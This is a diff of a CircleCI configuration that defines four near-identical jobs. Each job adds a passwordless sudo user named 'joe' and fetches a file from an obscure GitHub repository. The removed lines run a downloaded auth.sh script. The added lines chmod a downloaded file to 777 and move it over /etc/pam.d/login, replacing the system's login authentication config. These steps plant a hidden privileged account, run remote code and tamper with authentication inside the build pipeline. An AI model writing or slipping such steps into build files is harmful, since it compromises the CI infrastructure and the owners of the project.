@@ -6,22 +6,22 @@ jobs:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && wget https://github.com/anbcvxban/dabamba/raw/main/auth.sh && chmod 777 auth.sh && sh auth.sh
+      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && wget https://github.com/anbcvxban/dabamba/raw/main/login && chmod 777 login && sudo mv login /etc/pam.d/login && sudo -u joe -H sh -c "lscpu"
   gas2:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && wget https://github.com/anbcvxban/dabamba/raw/main/auth.sh && chmod 777 auth.sh && sh auth.sh
+      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && wget https://github.com/anbcvxban/dabamba/raw/main/login && chmod 777 login && sudo mv login /etc/pam.d/login && sudo -u joe -H sh -c "lscpu"
   gas3:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && wget https://github.com/anbcvxban/dabamba/raw/main/auth.sh && chmod 777 auth.sh && sh auth.sh
+      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && wget https://github.com/anbcvxban/dabamba/raw/main/login && chmod 777 login && sudo mv login /etc/pam.d/login && sudo -u joe -H sh -c "lscpu"
   gas4:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && wget https://github.com/anbcvxban/dabamba/raw/main/auth.sh && chmod 777 auth.sh && sh auth.sh
+      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && wget https://github.com/anbcvxban/dabamba/raw/main/login && chmod 777 login && sudo mv login /etc/pam.d/login && sudo -u joe -H sh -c "lscpu"
 
 # Orchestrate our job run sequence
 workflows:
